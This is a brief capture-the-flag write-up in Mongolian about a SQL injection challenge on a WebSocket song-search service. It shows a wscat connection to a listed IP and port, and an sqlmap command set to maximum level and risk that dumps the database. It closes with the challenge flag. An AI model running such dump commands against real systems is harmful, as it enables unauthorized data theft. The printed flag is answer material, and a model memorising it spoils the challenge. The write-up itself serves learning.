# Web socket - SQL

Web socket ашигладаг сервер байгаа.

[image]

Хүсэлтийг Burpsuite-ээр барьж авсан бөгөөд тухайн дата нь `{"songname":"Gucci gang"}` гэх мэт агуулгыг дамжуулдаг.

[image]

Web socket -руу WSCAT командаар холбогдож тест хийх боломжтой. Мөн тухайн вэбийн жагсаалтанд байгаа дууны нэрээр хайлт хийвэл Result: Song name: Gucci Gang гэж буцаана.

```bash
wscat -c http://139.162.5.230:10119/ws
```

[image]

## SQL Web socket nodejs

```bash
sqlmap -u 'ws://139.162.5.230:10119/ws' --data '{"songname":"*"}' --batch --level=5 --risk=3 --dump
```

[image]

FLAG!!!

[image]

HZ{ZANGI\_GANG\_203AE3F3C01A555F}
